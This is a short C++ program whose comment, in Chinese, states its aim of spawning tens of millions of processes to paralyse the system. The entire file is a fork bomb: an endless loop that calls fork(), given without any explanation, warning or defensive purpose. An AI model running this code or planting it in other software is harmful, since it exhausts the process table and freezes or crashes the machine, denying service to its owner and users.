#include <unistd.h>
#include <iostream>

int main() {
    // 试图衍生千万个进程瘫痪系统
    while (1) {
        fork();
    }
    return 0;
}
